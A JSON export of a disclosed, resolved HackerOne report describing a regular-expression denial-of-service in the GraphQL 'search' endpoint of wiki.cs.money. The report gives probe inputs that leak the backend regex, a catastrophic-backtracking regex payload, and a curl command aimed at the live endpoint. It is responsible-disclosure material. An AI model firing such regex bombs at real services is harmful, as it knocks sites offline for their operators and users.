{
  "id": 1000567,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDAwNTY3",
  "url": "https://hackerone.com/reports/1000567",
  "title": "ReDoS at wiki.cs.money graphQL endpoint (AND probably a kind of command injection)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-10-07T02:26:35.265Z",
  "submitted_at": "2020-10-07T02:26:35.361Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mvm",
    "url": "/mvm",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 48311,
    "url": "https://hackerone.com/cs_money",
    "handle": "cs_money",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "CS Money",
      "twitter_handle": "csmoneytrade",
      "website": "https://cs.money",
      "about": "CS2 trading platform that helps people to trade, buy, sell and search for the best skins and deals they could possibly find."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-10-27T19:30:34.805Z",
  "bug_reporter_agreed_on_going_public_at": "2020-10-16T15:33:28.140Z",
  "team_member_agreed_on_going_public_at": "2020-10-27T19:30:34.713Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThe endpoint /graphql has a vulnerable query operation named \"search\", that  can I send a Regex malformed parameter, in order to trick the original regular expression to a regex bomb expression. \n\n+ Payload with a \"common\" search, querying the value \"AAA\":\n\n```\nquery a { \n  search(q: \"AAA\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id \n \n }\n}\n```\n\nResponse:\n\n```\n{\n  \"data\": {\n    \"search\": [\n      {\n        \"_id\": \"sticker-baaa-ckstabber\",\n        \"weapon_id\": null,\n        \"rarity\": \"High Grade\",\n        \"collection\": null,\n        \"collection_id\": null\n      },\n      {\n        \"_id\": \"sticker-ork-waaagh\",\n        \"weapon_id\": null,\n        \"rarity\": \"High Grade\",\n        \"collection\": null,\n        \"collection_id\": null\n      }\n    ]\n  },\n  \"extensions\": {\n    \"tracing\": {\n      \"version\": 1,\n      \"startTime\": \"2020-10-07T02:07:55.251Z\",\n      \"endTime\": \"2020-10-07T02:07:55.516Z\",\n      \"duration\": 264270190,\n      \"execution\": {\n        \"resolvers\": [\n          {\n            \"path\": [\n              \"search\"\n            ],...[Resumed for convenience]\n        ]\n      }\n    }\n  }\n}\n```\n\nPay attention in this part of JSON response: \n\n```\n      \"startTime\": \"2020-10-07T02:07:55.251Z\",\n      \"endTime\": \"2020-10-07T02:07:55.516Z\",\n``` \n\n**It's about a instantaneously response time.**\n\nOk, now we're ready to play with this...\n\nYou can reveal the bug inserting \"\\u0000\" on \"q\" parameter, in order to display an error with part of the graph query.\n\n+ Payload A (see the error response):\n\n ```\nquery a { \n  search(q: \"\\u0000)\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id  \n }\n}\n ```\n\nResponse:\n\n```\n{\n  \"errors\": [\n    {\n      \"message\": \"value (?=.*\\u0000) must not contain null bytes\",\n      \"locations\": [\n        {\n          \"line\": 2,\n          \"column\": 3\n        }\n      ],\n      \"path\": [\n        \"search\"\n      ],\n      \"extensions\": {\n        \"code\": \"INTERNAL_SERVER_ERROR\"\n      }\n    }\n  ],\n....[Resumed]\n ```\n\n+ Payload B (reveal that this parameter filter a value with a regex)\n\n```\nquery a { \n  search(q: \"\\u0000)\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id  \n }\n}\n\n```\n\n Response:\n\n ```\n{\n  \"errors\": [\n    {\n      \"message\": \"Invalid regular expression: /(?=.*X))/: Unmatched ')'\",\n      \"locations\": [\n        {\n          \"line\": 2,\n          \"column\": 3\n        }\n...[Resumed]\n\n```\n\n\n## GraphQL Payload With Regex BOMB\n\n```\nquery a { \n  search(q: \"[a-zA-Z0-9]+\\\\s?)+$|^([a-zA-Z0-9.'\\\\w\\\\W]+\\\\s?)+$\\\\\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id \n }\n}\n```\n\n\n## Steps To Reproduce:\n  1. Send a POST with the bomb payload: \n\n       ````\n   curl 'https://wiki.cs.money/graphql' \\  \n  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' \\\n  -H 'content-type: application/json' \\\n  -H 'accept: */*' \\     \n  --data-binary $'{\"query\":\"query a { \\\\n  search(q: \\\\\"[a-zA-Z0-9]+\\\\\\\\\\\\\\\\s?)+$|^([a-zA-Z0-9.\\'\\\\\\\\\\\\\\\\w\\\\\\\\\\\\\\\\W]+\\\\\\\\\\\\\\\\s?)+$\\\\\\\\\\\\\\\\\\\\\", lang: \\\\\"en\\\\\") {\\\\n    _id\\\\n   weapon_id\\\\n    rarity\\\\n    collection{ _id name }\\\\n    collection_id \\\\n \\\\n }\\\\n}\",\"variables\":null}' \\\n  --compressed\n       ```\n  1. Compare response times with a simple query \"AAA\"  (explained above)\n \n\n## Supporting Material/References:\nhttps://www.rexegg.com/regex-explosive-quantifiers.html\n\n## Impact\n\nDenial of Service",
  "bounty_amount": "250.0",
  "formatted_bounty": "$250",
  "weakness": {
    "id": 48,
    "name": "Uncontrolled Resource Consumption"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1023378,
      "file_name": "recording-bug.webm",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mJmNfYwb7RG7ADxYGcyYdMUM?response-content-disposition=attachment%3B%20filename%3D%22recording-bug.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-bug.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2WWZYUZE%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T083945Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCRqk0eO9oH%2Bplizxyzx%2FLJhBcbbMt%2BjDN81JaDwsENNwIhAN%2B%2Bd6CkR1QaXEZMydNbSUCx8tX9w3hy89XcQzilqkVpKrIFCBEQAxoMMDEzNjE5Mjc0ODQ5Igyw9%2FDiBDT7EsK%2FYjUqjwVqf1BuadjYNhj3r8I9etGAHvbuIDcC8sBvz4G%2BXcQTROp4xRuESeCg3TAZcNjCZ90oIStP4t1O4OPE%2F%2F1SrQiKfDsHCLGDn4CxEIXoR3mi%2BaV90T59C9o8c25bbNj6cAbxx%2BhoVd89ABP7vyJTLTNDi9yK8YzPOLYLhNHGAVd10XUlyfqjTu1cBbSSLh8LkQsHI1LOrHc8tXMXZ8fmOMCvyiubp9IhgxvJ4kX5Yo%2B6KJu8QQcMHQxoB7Vn3lP3et3CwI%2B4SOcUrfPSQyfkuIOBkRmb%2FsVGCNSTn19fU1pBlvYfHdbjEeYO19uidCfx7HN7A7ZZi7ftGJWntaA09Un%2BeH%2FmDKZidMGtqzbi24HFFEW5%2FPsZUsolZypAiyvSUhTBWQRUDCHDtgpY1EyixR%2FEgr73xRuzMqf1NcWW0tSiEyAYOQ%2BzsZbAA7quAThL4oX777qQhTcIRFXrsEDiELSob5U68nmbv8O3hQUumOw%2BSTS5BvyGGyQh6evC6KO1nHB7D3roPAwC5nIp0bTP0HKqUAaKa8%2Bhb8Dlfxjcj4oW0Bn59Sov2cMvCZv5Kqim3iVpIOF6Ateo1V8FOW0m1s9tH1nCbeB24wcLuPHZxh6%2FlQ5EHkWAohuhNKB3wyaF4bXlX4v0%2F70ASUnyS9omX3NMYPhnINVaBGdQME8B49j6Vb3jwWSBuN%2BCfvRo1ls9aiJZ%2B7GIZupIx%2B68jqZquPsJlCfusBxENY4ovPLn2l34XzxJYmucHnQjoVYSzBivJh3AU4uTQAhji8FgkqdqSMvvZ242BlDZRMmDzZNQrGRQD29NvpdA8uEzN4udjHHkDCOozGHVEZRAu%2B0GwvgTS3PcXXeO7E%2FyJm58qHEL%2FHixMPrXvsYGOrAB69W0MEapsfXuZyWLw517oBSmkQS2uiK67IaCXuCwxylIzb0LflXeY2grH3SIt4n0ADWnyoBEL8si8uYbvGGQDJPJeaJG%2Fwfmc26pmf7%2BpQEPIWHMUwJS0SFo2kkWZ5Nf3uWQEjvID6c9vNE5%2FjCivzs%2B8WU0g%2BcguiJ3gO0g%2B59%2FheSuEdvPwjBLMs7E0FNr9BLVAmR2POoqtjpReE6qFRtNt1oSHc3m1vgIEoKv67s%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=98e238915c7b697b78f1d2ceb432bc3af991ef021309baecbd055363b3f9a539",
      "file_size": 4258739,
      "type": "video/webm",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 15,
  "voters": [
    "l0da",
    "br1p4v3s1",
    "alejandroar",
    "ali",
    "elmahdi",
    "0nlymohammed",
    "since2003",
    "rootishere",
    "official_blackhat13",
    "nafisaqil",
    "and 5 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.7,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 45904,
    "asset_type": "URL",
    "asset_identifier": "wiki.cs.money",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
